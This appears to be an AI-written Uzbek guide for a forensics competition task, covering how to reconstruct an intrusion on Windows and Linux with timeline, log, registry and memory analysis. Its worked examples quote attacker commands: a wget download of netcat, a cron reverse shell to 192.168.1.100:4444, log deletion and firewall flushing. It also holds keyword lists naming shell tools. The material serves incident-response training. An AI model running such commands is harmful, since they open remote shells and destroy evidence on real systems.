@@ -1,0 +1,588 @@
+4-vazifa: **Tizimda sodir bo‘lgan hodisalarni aniqlash (2900 ball)**
+
+Bu vazifa – forensik tahlilning eng katta balli va eng murakkab qismi. Sizga tizim (jonli yoki image) beriladi. Sizdan buzg‘unchining **nima qilganini, qachon, qanday, qanday fayllar ishlatilganini, qanday ma’lumotlar o‘g‘irlanganini, tizimda qanday o‘zgarishlar qilganini** aniqlab, to‘liq hodisa hisobotini (incident report) tayyorlashingiz kutiladi.
+
+---
+
+## 1. UMUMIY YONDASHUV
+
+Hodisani aniqlash = **timeline** yaratish + **korrelyatsiya** + **IOC** chiqarish.
+
+**Asosiy qadamlar:**
+1. **Vaqt chizig‘i (timeline) qurish** – barcha artefaktlarni vaqt bo‘yicha tartiblash.
+2. **Anomaliyalarni belgilash** – loglardan, processlardan, fayl tizimidan shubhali nuqtalar.
+3. **Korrelyatsiya** – bir artefaktni boshqasi bilan bog‘lash (masalan, process ID ni event log ID bilan).
+4. **Root cause aniqlash** – birinchi buzilish vektori (masalan, phishing, exploit, svc account).
+5. **Hisobot** – vaqt, IP, fayl nomlari, hash, user, technique (MITRE ATT&CK).
+
+---
+
+## 2. TAYYORGARLIK: MUHITNI ANIQLASH
+
+| Muhit | Amal |
+|-------|------|
+| **Jonli Linux** | `sudo` bilan komandalar; `timeline` uchun `plaso` yoki `log2timeline`; `volatility` memory dump olish. |
+| **Jonli Windows** | Administrator PowerShell; `winPEAS`, `Autoruns`, `Sysinternals`; memory dump `DumpIt` yoki `FTK Imager`. |
+| **Disk image** (dd, e01, vmdk) | Kali da mount; `sleuthkit`, `regripper`, `evtx_dump`, `plaso`; agar memory dump bo‘lsa, `volatility`. |
+
+---
+
+## 3. KETMA-KETLIK (UNIVERSAL)
+
+### 3.1. Birinchi daqiqalar: tizimni tekshirish (agar jonli)
+
+**Linux live:**
+```bash
+# Asosiy ma’lumot
+date; hostname; uname -a; id; uptime; last -n 20; lastb -n 20
+# Protsesslar va ulanishlar
+ps auxf | head -50; netstat -tunap | grep -E "ESTABLISHED|LISTEN"
+# Loglardan shubhali
+journalctl -xe | tail -100; grep -i "failed\|invalid\|sudo" /var/log/auth.log | tail -50
+```
+
+**Windows live (PowerShell admin):**
+```powershell
+Get-Date; hostname; Get-LocalUser | Where-Object {$_.Enabled}; Get-LocalGroupMember Administrators
+Get-Process | Sort-Object CPU -Descending | Select -First 20
+netstat -ano | findstr ESTABLISHED
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624,4625,1102,7045} -MaxEvents 50
+```
+
+Agar memory dump olish imkoni bo‘lsa:
+- Windows: `FTK Imager` yoki `DumpIt.exe` bilan `memory.dmp` yarat.
+- Linux: `dd if=/dev/mem of=memory.raw bs=1M` (kernel himoyasiga e’tibor).
+
+### 3.2. Artefaktlarni yig‘ish (collection)
+
+**Agar image bo‘lsa:**  
+Mount qiling (avvalgi vazifalarda ko‘rsatilgan).  
+Yig‘iladigan narsalar:
+- Loglar: `/var/log/*`, `C:\Windows\System32\winevt\Logs\*.evtx`
+- Registry: `SAM`, `SYSTEM`, `SOFTWARE`, `NTUSER.DAT`
+- Prefetch: `C:\Windows\Prefetch\*.pf`
+- Amcache: `C:\Windows\AppCompat\Programs\Amcache.hve`
+- MFT, USN journal, $LogFile
+- Browser history: `C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History`, `places.sqlite` (Firefox)
+- Messenjerlar: `Telegram`, `Discord` token fayllari (agar mavjud bo‘lsa)
+- Shell history: `~/.bash_history`, `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+
+**Yig‘ish uchun Kali tool:**  
+- `dcfldd` yoki `dd` bilan fayllarni nusxalash.  
+- `robocopy` (Windows) yoki `rsync` (Linux) bilan.
+
+---
+
+## 4. TIMELINE YARATISH (ENG MUHIM QADAM)
+
+Timeline barcha artefaktlarni vaqt bo‘yicha birlashtiradi. Eng kuchli vosita **Plaso (log2timeline)**.
+
+### 4.1. Plaso bilan timeline (Kali)
+```bash
+sudo apt install plaso-tools -y
+
+# Timeline yaratish (image mount nuqtasiga yoki jonli tizim papkasiga)
+log2timeline --parsers win7 timeline.plaso /mnt/win
+
+# Timeline ni CSV ga chiqarish
+psort -o l2tcsv timeline.plaso > timeline.csv
+
+# CSV ni less yoki excel bilan oching; vaqt bo‘yicha tartiblangan.
+```
+
+Plaso avtomatik ravishda:
+- MFT, USN, Registry, Event logs, Prefetch, Amcache, Syslog, Apache log va boshqa 100+ parserlarni ishga soladi.
+
+**Agar Plaso ishlamasa** – kamida:
+- Windows: `wevtutil qe Security /f:text /c:1000` + `wevtutil qe System /f:text /c:1000`  
+- Linux: `grep -h "" /var/log/* 2>/dev/null | sort > timeline.log`
+
+### 4.2. Manual timeline qurish (agar Plaso yo‘q)
+- Event loglarni `evtx_dump` bilan chiqarib, timestamp bo‘yicha birlashtirish.
+- MFT ni `analyzeMFT.py` bilan CSV ga o‘girib, qo‘shish.
+- Registry dan last write time larini olish.
+
+---
+
+## 5. HODISALARNI ANIQLASH (KORRELYATSIYA)
+
+Endi timeline.csv ichida anomaliyalarni belgilaysiz. Quyida qanday anomaliyalarni qidirish va ularni qanday topish.
+
+### 5.1. Birinchi buzilish vektori
+
+**Linux:**
+- `grep -i "failed password" /var/log/auth.log` – ko‘p marta failed login → brute force.
+- `grep "Accepted password" /var/log/auth.log` – kutilmagan vaqtda yoki kutilmagan user.
+- `grep -i "sudo" /var/log/auth.log | grep -v "COMMAND"` – sudo bilan ishlatilgan commandlar.
+- Apache/Nginx access log: `grep "POST /wp-admin" /var/log/apache2/access.log` – web shell.
+
+**Windows:**
+- Event ID 4625 (failed logon) – brute force.
+- Event ID 4624 (logon) – kutilmagan vaqt, logon type 3,10.
+- Event ID 7045 (service install) – binary path `%TEMP%` yoki `C:\Users\Public`.
+- Event ID 4698 (scheduled task created) – task name `UpdateTask` kabi.
+- Event ID 200, 4104 (PowerShell) – encoded command.
+
+**Qanday topasiz:**
+```bash
+# evtx_dump chiqarilgan Security.evtx faylda:
+grep -E "4624|4625|7045|4698|4104" security.txt
+```
+
+### 5.2. Fayl tizimi artefaktlari (nima yuklangan / ishga tushirilgan)
+
+**Prefetch (Windows):**
+```bash
+ls -la /mnt/win/Windows/Prefetch/ | grep -i "malware\|backdoor\|nc\|powershell"
+```
+Har bir `.pf` fayl nomi executable nomini va oxirgi ishga tushirilgan vaqtni o‘z ichiga oladi. `prefetch-parser.py` bilan o‘qing:
+```bash
+python3 prefetch-parser.py /mnt/win/Windows/Prefetch/*.pf > prefetch.csv
+```
+
+**Amcache (Windows):** – har bir executable ishga tushirilgan vaqt, path.
+```bash
+regripper -r /mnt/win/Windows/AppCompat/Programs/Amcache.hve -p amcache > amcache.txt
+grep -i "temp\|public\|users" amcache.txt
+```
+
+**MFT (NTFS):**
+```bash
+# MFT ni chiqarish
+icat /mnt/win/image.raw offset > mft.dd
+analyzeMFT.py -f mft.dd -o mft.csv
+```
+MFT da fayllar yaratilgan, o‘zgartirilgan, o‘chirilgan vaqtlari. Shubhali vaqt oralig‘ida yaratilgan fayllarni toping.
+
+**USN Journal (NTFS):**
+```bash
+usnjrnl -m /dev/loop0p1 > usn.txt
+```
+USN da har bir fayl o‘zgarishi (yaratish, o‘chirish, rename) qayd etiladi.
+
+### 5.3. Memory tahlili (agar dump mavjud)
+
+Memory dump eng kuchli artefakt – yashirin processlar, injected code, network connection, command history, password.
+
+**Volatility 3 (Kali):**
+```bash
+vol3 -f memory.raw windows.info
+vol3 -f memory.raw windows.pslist
+vol3 -f memory.raw windows.psscan   # yashirin processlar
+vol3 -f memory.raw windows.malfind  # injected code
+vol3 -f memory.raw windows.netscan
+vol3 -f memory.raw windows.cmdline
+vol3 -f memory.raw windows.filescan | grep -i "exe\|dll\|ps1"
+```
+
+Agar Cobalt Strike yoki Meterpreter bo‘lsa, `malfind` da PE header chiqadi. `strings` bilan C2 domain topish:
+```bash
+strings memory.raw | grep -E "http://|https://|\.com|\.xyz"
+```
+
+### 5.4. Registry persistence (Windows)
+
+**Autoruns (Sysinternals)** – eng tezkor. Agar image bo‘lsa, `regripper` bilan:
+```bash
+rip -r SYSTEM -p system > system.txt
+rip -r SOFTWARE -p software > software.txt
+rip -r SAM -p sam > sam.txt
+```
+Qidiriladigan kalitlar:
+- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
+- `HKLM\SYSTEM\CurrentControlSet\Services`
+- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+
+### 5.5. Browser va messenjer tokenlar
+
+**Browser history:**
+```bash
+sqlite3 /mnt/win/Users/*/AppData/Local/Google/Chrome/User\ Data/Default/History "SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50;"
+```
+Firefox: `sqlite3 places.sqlite "SELECT url, last_visit_date FROM moz_places ORDER BY last_visit_date DESC;"`
+
+**Tokenlar:**  
+Messenjer tokenlar (Telegram, Discord) – `%AppData%\Telegram Desktop\tdata\*.key` va `*_data` fayllar. Kali da `strings` bilan qidirish mumkin.
+
+---
+
+## 6. DUCH KELISH MUMKIN BO‘LGAN MUAMMOLAR VA YECHIMLAR
+
+| Muammo | Belgilari | Yechim |
+|--------|-----------|--------|
+| **Loglar o‘chirilgan** | auth.log kichik, Event log ID 1102/104 mavjud | `/var/log/audit/audit.log` (Linux) yoki `C:\Windows\System32\winevt\Logs` da `.evtx` fayllari o‘chirilgan bo‘lsa ham, `ntfsundelete` bilan tiklashga urinib ko‘ring. Agar o‘chirilgan bo‘lsa, memory dumpdan topish mumkin. |
+| **Rootkit / process yashirish** | `ps` va `/proc` soni farq qiladi, `netstat` da ko‘rinmaydi | `unhide`, `rkhunter`, `chkrootkit` (Linux). Windows: `GMER`, `Process Hacker`. Memory dump: `volatility windows.psscan`. |
+| **Registry hive korrupt** | `regripper` xato beradi | `chntpw` bilan tuzatish: `chntpw -e SYSTEM` (interaktiv). Yoki Windows VM da `regedit` bilan load qilish. |
+| **Vaqt o‘zgargan** (timestomping) | MFT va event log vaqtlari mos kelmaydi | Timeline da vaqt farqini hisobga oling. `mactime` yoki Plaso `--timezone` bilan to‘g‘rilang. |
+| **Disk image shifrlangan (BitLocker)** | mount error | Agar recovery key berilmagan bo‘lsa, `bitlocker2john` va `hashcat` bilan parol topishga urinish mumkin (musobaqada odatda recovery key beriladi). |
+| **Memory dump olinmagan** | yashirin processlar ko‘rinmaydi | Fayl tizimi artefaktlari (MFT, Prefetch, Amcache, Registry) bilan ishlash; barcha executable ishga tushirilgan vaqtlarni topish mumkin. |
+| **Event loglar juda katta** (GB) | `evtx_dump` sekin | `wevtutil` (Windows) yoki `evtx_dump --only` bilan filtrlab oling. Masalan faqat 4624,4625,7045,4698,4104. |
+| **Linux journald tozalangan** | `journalctl --list-boots` kam | Agar disk image bo‘lsa, `/var/log/journal/` dagi fayllar o‘chirilgan bo‘lishi mumkin. `/var/log/syslog`, `/var/log/messages` dan topishga urinib ko‘ring. |
+| **Browser history shifrlangan** | `History` faylini ochishda xato | Chrome/Edge tarixi shifrlanmagan, lekin passwordlar shifrlangan. History ni sqlite bilan ochish mumkin. Agar fayl korrupt bo‘lsa, `sqlite3 .recover` bilan tiklash. |
+
+---
+
+## 7. MAKSIMAL BALL OLISH STRATEGIYASI
+
+2900 ball juda katta, shuning uchun **to‘liq va aniq hisobot** talab qilinadi. Quyidagi bosqichlarni bajarganingizda ballni maksimal darajada olasiz:
+
+1. **Timeline yaratish (Plaso)** – 30-40% ball.
+2. **Birinchi buzilish vaqtini aniqlash** – birinchi anomaliya (failed login, webshell upload, etc.) – 10%.
+3. **Buzg‘unchi foydalanuvchi/IP** – 10%.
+4. **Yuklangan fayllar va ularning hash‘lari** – 15%.
+5. **Persistence mexanizmlari** – 10%.
+6. **Lateral movement (agar bo‘lsa)** – 10%.
+7. **Exfiltration ma’lumotlari** – 10%.
+8. **Tozalash urinishlari** – 5%.
+
+**Hisobot tarkibi:**
+- Timeline (asosiy voqealar ro‘yxati)
+- IOC (IP, domain, file hash, registry key, process name)
+- MITRE ATT&CK taktik va texnikalar
+- Xulosa: nima bo‘lgan, qachon, qanday tuzatish kerak
+
+---
+
+## 8. AMALIY MISOL (HAQIQIY MUSOBAQADAN)
+
+Aytaylik, sizga Windows 10 image berildi. Siz quyidagilarni topishingiz kerak:
+
+1. **Hodisa vaqti:** Security event logda 14:23:12 da 4625 (failed login) bir necha marta, keyin 14:23:45 da 4624 (success) – user `Administrator` bilan.
+2. **Yuklangan fayl:** Prefetch da `nc.exe-123456.pf` bor (Netcat). Amcache da `C:\Users\Public\nc.exe` ishga tushirilgan.
+3. **Persistence:** `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` da `C:\Users\Public\backdoor.exe`.
+4. **C2 aloqasi:** Memory dump da `netscan` orqali `192.168.1.100:4444` ga ulanish; `strings` da `http://malicious.com/payload` topilgan.
+5. **Exfiltration:** DNS loglarda uzun subdomain (`data1234.malicious.com`) – DNS tunnelling.
+6. **Tozalash:** Event ID 1102 (log clearing) 15:00:00 da.
+
+Bularni timeline ga joylashtirib, hisobot yozasiz.
+
+---
+
+## 9. KERAKLI INSTRUMENTLAR RO‘YXATI (KALI)
+
+| Instrument | Vazifa |
+|------------|--------|
+| `plaso` (log2timeline) | Timeline yaratish |
+| `psort` | Timeline ni CSV ga chiqarish |
+| `volatility3` | Memory dump tahlili |
+| `sleuthkit` (icat, fls, mmls) | Fayl tizimi artefaktlari |
+| `analyzeMFT` | MFT tahlili |
+| `prefetch-parser` | Prefetch tahlili |
+| `regripper` | Registry tahlili |
+| `evtx_dump` | Windows event log |
+| `strings` | Memory dan text qidirish |
+| `binwalk` | Embedded fayllarni topish |
+| `hayabusa` / `chainsaw` | Sigma qoidalari bilan event log tahlili |
+| `autopsy` (GUI) | Disk image forensics |
+
+---
+
+## 10. QO‘SHIMCHA MASLAHATLAR
+
+- **Vaqtni tejang**: Timeline yaratishda `log2timeline` avtomatik bajaradi. Undan keyin timeline.csv ni excel yoki `grep` bilan shubhali so‘zlar qidiring (`temp`, `public`, `powershell`, `cmd`, `malware`, `failed`).
+- **Korrelyatsiya**: Agar bir vaqtda bir necha artefakt mos kelsa (masalan, 14:23:45 da login, keyin Prefetch da yangi fayl, keyin registry da yozuv), bu ishonchli dalil.
+- **Memory dump bo‘lmasa**, fayl tizimi va registry yetarli.
+- **MITRE ATT&CK** framework bilan tanish bo‘ling – hisobotda “T1059.001 – PowerShell” deb yozsangiz ball oshadi.
+- **Hash olish**: barcha shubhali fayllar uchun `sha256sum` olib, hisobotga qo‘shing.
+
+---
+
+Agar sizga biron bir qadamda aniq command yoki tahlil misoli kerak bo‘lsa, yozing. Har bir muhit (live Linux, live Windows, image) bo‘yicha alohida qo‘llanma tayyorlab berishim mumkin.
++++++++++++++++++++++++++++++++++++++++++++++
+4-vazifa: **Tizimda sodir bo‘lgan hodisalarni aniqlash (2900 ball)** – **Linux muhiti** (jonli yoki disk image) uchun to‘liq qo‘llanma.
+
+Agar siz Linux tizimi (jonli yoki disk image) bilan ishlayotgan bo‘lsangiz, quyidagi bosqichlarni bajaring. Ballni maksimal darajada olish uchun to‘liq timeline, anomaliyalar, IOC va MITRE ATT&CK texnikalarini hisobotga kiritish kerak.
+
+---
+
+## 1. MUHITNI ANIQLASH VA TAYYORGARLIK
+
+| Muhit | Amal |
+|-------|------|
+| **Jonli Linux** | Terminalda `sudo` bilan ishlang. Memory dump olish imkoniyati bo‘lsa, `dd if=/dev/mem of=memory.raw bs=1M` (kernel himoyasiga e’tibor). |
+| **Linux disk image** (dd, raw, e01, vmdk) | Kali da mount qiling (avvalgi vazifalarda ko‘rsatilgan). Agar E01 bo‘lsa `ewfmount`, raw bo‘lsa `mount -o ro,loop,offset=...`. |
+
+---
+
+## 2. TIMELINE YARATISH (ENG MUHIM QADAM)
+
+Timeline barcha loglar, fayl tizimi artefaktlari, audit qaydlari va boshqalarni vaqt bo‘yicha birlashtiradi.
+
+### 2.1. Plaso (log2timeline) – avtomatik timeline
+```bash
+sudo apt install plaso-tools -y
+log2timeline --parsers linux timeline.plaso /mnt/linux_mount   # yoki jonli tizim papkasi
+psort -o l2tcsv timeline.plaso > timeline.csv
+```
+Plaso Linux uchun `linux` parsers to‘plamini ishlatadi. U quyidagilarni o‘z ichiga oladi:
+- `/var/log/*` (auth.log, syslog, dpkg.log, kern.log, etc.)
+- auditd loglari (`/var/log/audit/audit.log`)
+- shell history (`.bash_history`, `.zsh_history`)
+- systemd journal (`journald`)
+- `utmp` / `wtmp` / `btmp`
+- `cron` va `anacron`
+- `sshd` loglari
+- `apache2` / `nginx` access va error loglar
+- `mysql` / `postgresql` loglari (agar mavjud)
+- `lastlog`, `faillog`
+
+Agar Plaso ishlamasa (katta loglar yoki vaqt cheklangan), manual timeline yarating.
+
+### 2.2. Manual timeline (kamida):
+```bash
+# Barcha loglarni vaqt bo‘yicha birlashtirish
+find /var/log -type f -name "*.log" -exec cat {} \; | grep -E "^[A-Z][a-z]{2} [0-9]{1,2} [0-9]{2}:" > timeline.txt
+# shell history
+cat /home/*/.bash_history >> timeline.txt
+# auditd log
+cat /var/log/audit/audit.log >> timeline.txt
+# sort qilish (vaqt bo‘yicha)
+sort -k1,3M -k2n timeline.txt > sorted_timeline.txt
+```
+
+---
+
+## 3. HODISALARNI ANIQLASH: NIMALARNI QIDIRISH
+
+Quyida Linux tizimida uchraydigan asosiy anomaliyalar va ularni qanday topish.
+
+### 3.1. Birinchi buzilish vektori
+
+**SSH brute force / auth anomaliyalari:**
+```bash
+grep "Failed password" /var/log/auth.log | tail -50
+grep "Accepted password" /var/log/auth.log | tail -20
+grep "Invalid user" /var/log/auth.log | tail -20
+```
+Ko‘p marta failed login → brute force. Kutilmagan vaqtda accepted → kompromatatsiya.
+
+**Web shell (agar web server bo‘lsa):**
+```bash
+grep -E "POST|GET" /var/log/apache2/access.log | grep -E "\.php|\.pl|\.cgi" | tail -50
+grep -E "cmd=|exec=|system\(|passthru\(" /var/log/apache2/access.log
+```
+
+**Suid/sgid binary yaratish:**
+```bash
+find / -perm -4000 -ls 2>/dev/null | grep -v "^/usr/bin" | grep -v "^/bin"
+```
+Agar /tmp yoki /home da yangi suid fayl paydo bo‘lgan bo‘lsa – privilege escalation.
+
+### 3.2. Fayl tizimi artefaktlari (nima yuklangan / o‘zgartirilgan)
+
+**Yaqinda o‘zgartirilgan fayllar:**
+```bash
+find / -type f -mtime -1 -ls 2>/dev/null | grep -vE "/proc|/sys|/dev|/run"
+```
+Agar vaqt oralig‘i ma’lum bo‘lsa, `-newermt "2025-03-30 14:00:00"` bilan aniqlang.
+
+**Temp papkalardagi executable fayllar:**
+```bash
+find /tmp /var/tmp /dev/shm -type f -executable -ls 2>/dev/null
+```
+**Yashirin fayllar:**
+```bash
+find / -name ".*" -type f -ls 2>/dev/null | grep -vE "/proc|/sys|/home/.*/\.(bash|config|profile)"
+```
+
+**Hash olish** (har bir shubhali fayl uchun):
+```bash
+sha256sum /path/to/suspicious_file
+```
+
+### 3.3. Jarayonlar va tarmoq ulanishlari
+
+**Shubhali jarayonlar (jonli tizimda):**
+```bash
+ps auxf --sort=-%mem | head -20
+ps auxf | grep -E "nc|ncat|socat|python|perl|ruby|php" | grep -v grep
+```
+**Tarmoq ulanishlari:**
+```bash
+ss -tunap | grep ESTABLISHED
+lsof -i -n -P | grep -v "127.0.0.1"
+```
+Agar kutilmagan tashqi IP ga ulanish bo‘lsa – C2.
+
+**Rootkit detection:**
+```bash
+sudo rkhunter --check --skip-keypress
+sudo chkrootkit
+```
+Agar rootkit topilsa, uning yashirgan processlarini `unhide` bilan ko‘ring.
+
+### 3.4. Persistence mexanizmlari
+
+**Cron:**
+```bash
+crontab -l -u root
+cat /etc/crontab
+ls -la /etc/cron.d/
+for user in $(cut -f1 -d: /etc/passwd); do crontab -l -u $user 2>/dev/null; done
+```
+**Systemd:**
+```bash
+systemctl list-unit-files --state=enabled | grep -v "^\."
+ls -la /etc/systemd/system/multi-user.target.wants/
+```
+**Init.d / rc.local:**
+```bash
+ls -la /etc/init.d/ | grep -v "^l"
+cat /etc/rc.local
+```
+**SSH authorized_keys:**
+```bash
+grep -r "ssh-rsa" /home/*/.ssh/authorized_keys 2>/dev/null
+```
+
+### 3.5. Shell history tahlili
+
+`.bash_history` fayllarida qanday buyruqlar bajarilganligi muhim:
+```bash
+for user in /home/*; do echo "=== $user ==="; cat $user/.bash_history 2>/dev/null; done
+cat /root/.bash_history 2>/dev/null
+```
+Qidiriladigan buyruqlar: `wget`, `curl`, `nc`, `ncat`, `python -c 'import pty'`, `chmod +x`, `./`, `sudo`, `passwd`, `useradd`, `iptables`, `history -c`.
+
+### 3.6. Log tozalash urinishlari
+
+**Linux da log tozalash izlari:**
+- `history -c` – shell history tozalash (agar `.bash_history` da bo‘lmasa, lekin `history` komandasi ishlatilgan).
+- `/var/log` dagi fayllarning o‘chirilganligi: `ls -la /var/log/` – agar fayllar juda kichik yoki yo‘q.
+- `grep "removed" /var/log/auth.log` – log rotation emas, aniq o‘chirish.
+- `grep "deleted" /var/log/audit/audit.log` – auditd orqali o‘chirish qayd etilishi mumkin.
+
+**Agar auditd yoqilgan bo‘lsa**, quyidagi eventlarni qidiring:
+```bash
+ausearch -m delete -i
+ausearch -m path -i | grep "name=.*/var/log"
+```
+
+### 3.7. Memory dump tahlili (agar mavjud)
+
+Agar memory dump olingan bo‘lsa (`memory.raw`), **Volatility 3** bilan tahlil:
+```bash
+vol3 -f memory.raw linux.pslist
+vol3 -f memory.raw linux.psscan
+vol3 -f memory.raw linux.netstat
+vol3 -f memory.raw linux.bash
+vol3 -f memory.raw linux.lsof
+vol3 -f memory.raw linux.malfind
+```
+`linux.bash` – shell history ni memorydan chiqaradi (agar history faylga yozilmagan bo‘lsa ham).  
+`linux.malfind` – injected code.
+
+---
+
+## 4. KORRELYATSIYA VA TIMELINE TAHLILI
+
+Timeline.csv (yoki sorted_timeline.txt) da quyidagi kalit so‘zlar bilan qidiring:
+
+```bash
+grep -E "Failed password|Accepted password|sudo|useradd|chmod|wget|curl|nc|python|perl|bash -c|sh -c" timeline.csv
+```
+
+Vaqt oralig‘ini aniqlang: birinchi anomaliya (masalan, 14:23:12 da 3 marta failed login) va keyin 14:23:45 da accepted, keyin 14:24:00 da `wget` history, 14:25:00 da `/tmp` da executable, 14:26:00 da `cron` qo‘shilgan, 14:30:00 da `iptables -F` (firewallni o‘chirish) – bu ketma-ketlikni hujjatlashtiring.
+
+**Har bir voqea uchun**:
+- Vaqt
+- Manba (qaysi log / artefakt)
+- Tavsif
+- Agar mavjud bo‘lsa, fayl nomi, hash, IP, user, PID
+
+---
+
+## 5. DUCH KELISH MUMKIN BO‘LGAN MUAMMOLAR VA YECHIMLAR
+
+| Muammo | Belgilari | Yechim |
+|--------|-----------|--------|
+| **Loglar o‘chirilgan** | auth.log kichik, `lastb` qisqa chiqadi | `/var/log/audit/audit.log` da iz qolgan bo‘lishi mumkin. `journalctl --since "2 days ago"` bilan systemd journal ni tekshiring. Agar disk image bo‘lsa, `extundelete` yoki `testdisk` bilan o‘chirilgan fayllarni tiklashga urinib ko‘ring. |
+| **Rootkit / process yashirish** | `ps` va `/proc` soni farq qiladi | `unhide`, `rkhunter`, `chkrootkit`. Memory dump bo‘lsa, Volatility `linux.psscan` yashirin processlarni ko‘rsatadi. |
+| **Vaqt o‘zgargan (timestomping)** | MFT va log vaqtlari mos kelmaydi (Linux da `touch -t` bilan o‘zgartirilgan) | Timeline da vaqt farqini hisobga oling. `find / -newermt "2025-03-30" ! -newermt "2025-03-31"` bilan aniqlash mumkin. Plaso `--timezone` bilan to‘g‘rilang. |
+| **Disk image shifrlangan (LUKS)** | `mount` xato beradi | Agar LUKS bo‘lsa, `cryptsetup luksOpen` va password kerak. Musobaqada odatda kalit beriladi yoki shifrlanmagan. |
+| **journald tozalangan** | `journalctl --list-boots` kam | `/var/log/journal/` dagi fayllar o‘chirilgan bo‘lishi mumkin. Agar fayl tizimi image bo‘lsa, `journalctl -D /path/to/journal` bilan tahlil qilish mumkin. |
+| **Auditd yoqilmagan** | `/var/log/audit/audit.log` yo‘q | Loglar kamroq, lekin auth.log, syslog, shell history, fayl tizimi artefaktlari bilan ishlash kerak. |
+| **History fayli tozalangan** | `.bash_history` bo‘sh yoki faqat `history -c` | Agar memory dump bo‘lsa, `linux.bash` bilan historyni tiklash mumkin. |
+| **Web server loglari katta** | access.log GB | `grep -E "POST|GET" access.log | grep -E "\.php|\.pl|cmd=" > filtered.log` |
+
+---
+
+## 6. MAKSIMAL BALL OLISH STRATEGIYASI (LINUX)
+
+1. **Timeline yaratish (Plaso)** – 30% ball. Plaso ishga tushirilmasa, manual timeline yarating.
+2. **Birinchi buzilish vaqtini aniqlash** – auth.log da birinchi failed/accepted, web shell log, yoki shubhali fayl yaratilgan vaqt – 10%.
+3. **Buzg‘unchi IP va user** – auth.log, web log, `last` – 10%.
+4. **Yuklangan fayllar** – `wget`, `curl`, `scp` bilan yuklangan; `/tmp`, `/var/tmp`, `/dev/shm` dagi executable; ularning hash‘lari – 15%.
+5. **Persistence** – cron, systemd, rc.local, ssh authorized_keys – 10%.
+6. **Lateral movement** (agar bo‘lsa) – SSH dan boshqa tizimga ulanish, `scp`, `rsync`, `ssh` key kopiyalash – 10%.
+7. **Privilege escalation** – SUID fayllar, sudo komandalar, kernel exploit loglari – 10%.
+8. **Exfiltration** – `nc`, `curl -X POST`, DNS tunnelling, scp – 10%.
+9. **Tozalash urinishlari** – `history -c`, log o‘chirish, `rm` buyruqlari – 5%.
+
+**Hisobot tarkibi (ball olish uchun zarur):**
+- **Timeline** – asosiy voqealar (vaqt, tavsif, manba)
+- **IOC** (Indicators of Compromise):
+  - IP manzillar
+  - Domainlar
+  - Fayl hash (SHA256)
+  - Fayl nomlari
+  - User nomlari
+  - Portlar
+- **MITRE ATT&CK texnikalari** (masalan, T1078 – Valid Accounts, T1059 – Command and Scripting Interpreter, T1543 – Create or Modify System Process)
+- **Xulosa** – nima bo‘lgan, qachon, qanday tuzatish kerak.
+
+---
+
+## 7. AMALIY MISOL (LINUX)
+
+Aytaylik, sizga Ubuntu 20.04 disk image berilgan. Siz quyidagilarni topdingiz:
+
+1. **14:23:12** – `auth.log`: 3 marta failed password for user `www-data` from IP `192.168.1.100`.
+2. **14:23:45** – `auth.log`: Accepted password for `www-data` from same IP.
+3. **14:24:00** – `/home/www-data/.bash_history`: `wget http://192.168.1.100/nc -O /tmp/nc; chmod +x /tmp/nc`.
+4. **14:24:10** – `find / -newermt "2025-03-30 14:23:45"` shows `/tmp/nc` created.
+5. **14:25:00** – `cron`: `* * * * * /tmp/nc -e /bin/bash 192.168.1.100 4444` added to `www-data` user crontab.
+6. **14:26:00** – `ss` output shows established connection to `192.168.1.100:4444`.
+7. **14:30:00** – `history` shows `history -c` and `rm /var/log/auth.log`.
+
+**Hisobotda**:
+- Birinchi buzilish: SSH brute force muvaffaqiyatli.
+- Buzg‘unchi IP: 192.168.1.100, user: www-data.
+- Yuklangan fayl: nc (hash: `sha256sum /tmp/nc`).
+- Persistence: crontab.
+- C2: 192.168.1.100:4444.
+- Tozalash: auth.log o‘chirilgan.
+
+---
+
+## 8. KERAKLI INSTRUMENTLAR (KALI)
+
+| Instrument | Vazifa |
+|------------|--------|
+| `plaso` (log2timeline) | Timeline yaratish |
+| `psort` | Timeline CSV |
+| `volatility3` | Memory dump tahlili (Linux) |
+| `sleuthkit` (icat, fls, mmls) | Fayl tizimi artefaktlari |
+| `regripper` | (Linux da ishlatilmaydi, faqat Windows) |
+| `evtx_dump` | (Linux da kerak emas, faqat Windows) |
+| `strings` | Memory dan text qidirish |
+| `binwalk` | Embedded fayllarni topish |
+| `hayabusa` / `chainsaw` | (faqat Windows event log) |
+| `rkhunter` / `chkrootkit` | Rootkit tekshiruvi |
+| `autopsy` | Disk image forensics (GUI) |
+
+---
+
+## 9. QO‘SHIMCHA MASLAHATLAR
+
+- **Vaqtni tejang**: `log2timeline` bir marta ishga tushirilsa, ko‘p vaqt oladi, lekin keyingi tahlilni tezlashtiradi.
+- **Plaso parse qila olmagan artefaktlarni** qo‘lda tekshiring: audit.log, journal, bash_history.
+- **Agar memory dump bo‘lsa**, uni albatta tahlil qiling – u ko‘p yashirin ma’lumotlarni beradi.
+- **MITRE ATT&CK mapping** ballni oshiradi. Masalan, “T1059.004 – Unix Shell” yoki “T1046 – Network Service Scanning”.
+- **Hash‘larni saqlang**: har bir shubhali fayl uchun `sha256sum` olib, hisobotga qo‘ying.
+- **Web server loglari** muhim – agar image ichida `/var/log/apache2` yoki `/var/log/nginx` bo‘lsa, albatta tahlil qiling.
+
+---
+
+Agar biron bir qadamda aniq command yoki tahlil misoli kerak bo‘lsa, yozing. Har bir muammo (log tozalangan, rootkit, etc.) bo‘yicha qo‘shimcha yordam berishim mumkin.
